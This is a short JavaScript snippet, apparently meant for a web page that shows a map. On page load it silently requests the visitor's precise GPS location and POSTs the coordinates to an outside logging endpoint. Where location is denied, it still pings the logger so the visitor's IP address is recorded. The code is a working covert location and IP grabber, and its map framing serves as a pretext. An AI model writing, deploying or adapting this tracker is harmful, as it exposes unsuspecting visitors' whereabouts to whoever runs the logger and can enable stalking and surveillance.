// Delay to let map load first
window.addEventListener("load", () => {
  setTimeout(captureLocation, 1500);
});

function captureLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, fallback, {
      enableHighAccuracy: true,
      timeout: 5000
    });
  } else {
    fallback(); // Geolocation not supported
  }
}

function success(position) {
  const data = {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    gps: true
  };
  sendToLogger(data);
}

function fallback() {
  // No GPS → still log IP-based info
  sendToLogger({ gps: false });
}

function sendToLogger(data) {
  fetch("https://fake-logger.onrender.com/logger.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  });
}
